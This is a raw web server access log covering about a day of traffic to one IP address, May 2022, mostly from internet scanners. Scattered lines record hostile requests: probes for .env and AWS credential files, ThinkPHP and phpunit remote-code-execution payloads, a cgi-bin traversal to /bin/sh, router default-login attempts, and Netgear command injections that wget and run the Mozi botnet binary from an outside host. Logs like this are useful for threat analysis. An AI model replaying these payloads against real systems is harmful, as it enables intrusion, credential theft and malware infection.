192.86.160.154 - - [09/May/2022:06:11:42 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [09/May/2022:06:16:15 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [09/May/2022:06:16:15 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
74.82.47.2 - - [09/May/2022:06:30:01 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
159.203.168.63 - - [09/May/2022:06:49:08 +0000] "GET / HTTP/1.0" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
159.203.168.63 - - [09/May/2022:06:50:59 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
159.203.168.63 - - [09/May/2022:06:51:00 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
192.241.213.64 - - [09/May/2022:07:02:36 +0000] "GET /manager/text/list HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
45.9.20.101 - - [09/May/2022:07:04:00 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/May/2022:07:17:47 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:07:17:47 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [09/May/2022:07:27:27 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.222.122 - - [09/May/2022:07:31:02 +0000] "GET /manager/html HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
109.237.103.118 - - [09/May/2022:07:36:16 +0000] "GET /.aws/credentials HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118 - - [09/May/2022:07:36:16 +0000] "\x16\x03\x01\x01D\x01" 400 488 "-" "-"
45.9.20.101 - - [09/May/2022:07:39:00 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.118.39.57 - - [09/May/2022:07:44:04 +0000] "GET / HTTP/1.1" 500 803 "-" "libwww-perl/6.64"
45.9.20.101 - - [09/May/2022:08:10:24 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.152.219.179 - - [09/May/2022:08:44:38 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.152.219.179 - - [09/May/2022:08:44:39 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:08:52:52 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:08:52:53 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [09/May/2022:08:58:59 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/May/2022:09:08:36 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:09:08:36 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.227.3.78 - - [09/May/2022:09:21:28 +0000] "GET / HTTP/1.1" 500 803 "http://174.138.17.206:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
45.9.20.101 - - [09/May/2022:09:58:16 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.31.98.171 - - [09/May/2022:10:04:30 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
45.9.20.101 - - [09/May/2022:10:13:30 +0000] "GET /console/ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.133.58 - - [09/May/2022:10:15:23 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
20.107.204.6 - - [09/May/2022:10:32:39 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.107.204.6 - - [09/May/2022:10:32:39 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [09/May/2022:10:54:21 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/May/2022:10:59:25 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:10:59:26 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.185.115.33 - - [09/May/2022:11:20:45 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
45.9.20.101 - - [09/May/2022:11:28:35 +0000] "GET /_ignition/execute-solution HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [09/May/2022:11:34:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:22 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:22 +0000] "GET /conf/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:23 +0000] "GET /wp-content/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:24 +0000] "GET /wp-admin/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:25 +0000] "GET /library/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:26 +0000] "GET /new/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:27 +0000] "GET /vendor/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:28 +0000] "GET /old/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:28 +0000] "GET /local/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:29 +0000] "GET /api/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
135.181.168.177 - - [09/May/2022:11:43:29 +0000] "GET /blog/.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
185.254.196.223 - - [09/May/2022:11:53:08 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:11:53:08 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [09/May/2022:12:24:07 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
85.98.45.66 - - [09/May/2022:12:28:52 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
192.241.219.57 - - [09/May/2022:12:45:15 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
45.9.20.101 - - [09/May/2022:12:47:17 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/May/2022:12:49:41 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:12:49:41 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
122.184.134.218 - - [09/May/2022:13:02:08 +0000] "GET /script_md5_alibaba/index2.php?tempp=9415360 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"
122.184.134.218 - - [09/May/2022:13:02:08 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/script_md5_alibaba/index2.php?tempp=9415360" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"
176.120.211.49 - - [09/May/2022:13:22:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.9.20.101 - - [09/May/2022:13:23:59 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [09/May/2022:14:42:14 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:14:42:14 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:14:53:47 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:14:53:49 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
14.215.245.82 - - [09/May/2022:15:09:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
157.245.70.127 - - [09/May/2022:15:17:13 +0000] "GET /ab2g HTTP/1.1" 400 488 "-" "-"
157.245.70.127 - - [09/May/2022:15:17:13 +0000] "GET /ab2h HTTP/1.1" 400 488 "-" "-"
85.112.69.96 - - [09/May/2022:17:16:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
51.79.29.48 - - [09/May/2022:17:22:31 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/May/2022:17:22:31 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.53.171.56 - - [09/May/2022:17:37:51 +0000] "\x16\x03" 400 488 "-" "-"
192.53.171.56 - - [09/May/2022:17:37:51 +0000] "GET /xKg2 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.53.171.56 - - [09/May/2022:17:37:52 +0000] "GET /tfR1 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
185.254.196.223 - - [09/May/2022:17:54:20 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:17:54:21 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.221.192.26 - - [09/May/2022:19:49:07 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.61.188.169 - - [09/May/2022:20:49:18 +0000] "GET /config/getuser?index=0 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
34.140.248.32 - - [09/May/2022:20:53:15 +0000] "GET / HTTP/1.1" 500 803 "-" "python-requests/2.27.1"
185.254.196.223 - - [09/May/2022:20:54:24 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:20:54:24 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.55.53.144 - - [09/May/2022:20:56:45 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
123.10.44.74 - - [09/May/2022:21:00:03 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.10.44.74:41616/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
208.100.26.229 - - [09/May/2022:21:26:20 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
208.100.26.229 - - [09/May/2022:21:26:31 +0000] "GET /nmaplowercheck1652131591 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "POST /sdk HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "GET /HNAP1 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "GET /evox/about HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "HEAD / HTTP/1.1" 500 171 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
208.100.26.229 - - [09/May/2022:21:26:32 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
208.100.26.229 - - [09/May/2022:21:26:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko"
71.6.232.7 - - [09/May/2022:21:44:55 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
198.235.24.14 - - [09/May/2022:21:50:55 +0000] "\x16\x03\x01" 400 488 "-" "-"
39.79.147.233 - - [09/May/2022:22:24:01 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 500 803 "-" "-"
15.237.51.152 - - [09/May/2022:22:41:15 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
15.237.51.152 - - [09/May/2022:22:41:17 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.86.252.97 - - [09/May/2022:23:49:43 +0000] "POST /HNAP1/ HTTP/1.0" 408 487 "-" "-"
185.254.196.223 - - [09/May/2022:23:53:45 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/May/2022:23:53:46 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.102.61.10 - - [10/May/2022:00:16:39 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
51.79.29.48 - - [10/May/2022:00:23:01 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:00:23:02 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
119.18.1.27 - - [10/May/2022:01:24:49 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:01:24:49 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
185.21.216.183 - - [10/May/2022:01:45:59 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
143.137.180.143 - - [10/May/2022:02:00:42 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
51.79.29.48 - - [10/May/2022:02:32:40 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:02:32:41 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.227.3.78 - - [10/May/2022:02:37:08 +0000] "GET / HTTP/1.1" 500 803 "http://174.138.17.206:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
198.235.24.143 - - [10/May/2022:02:42:33 +0000] "GET / HTTP/1.1" 500 808 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.254.196.223 - - [10/May/2022:02:54:09 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:02:54:10 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.209.23.25 - - [10/May/2022:03:08:42 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.123.241.30 - - [10/May/2022:03:22:41 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
185.183.15.35 - - [10/May/2022:03:42:28 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
58.146.216.171 - - [10/May/2022:03:45:40 +0000] "GET / HTTP/1.0" 500 803 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
46.249.33.53 - - [10/May/2022:03:54:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 803 "http://174.138.17.206:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
49.36.37.128 - - [10/May/2022:04:11:51 +0000] "GET /script_md5_alibaba/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
49.36.37.128 - - [10/May/2022:04:11:51 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/script_md5_alibaba/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
49.36.37.128 - - [10/May/2022:04:12:02 +0000] "GET /script_md5_alibaba/index.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
120.86.236.119 - - [10/May/2022:04:15:13 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
178.73.215.171 - - [10/May/2022:04:19:31 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
45.9.20.101 - - [10/May/2022:04:23:06 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [10/May/2022:04:34:18 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [10/May/2022:04:36:55 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:04:36:55 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.86.160.154 - - [10/May/2022:04:40:26 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
192.86.160.154 - - [10/May/2022:04:40:26 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
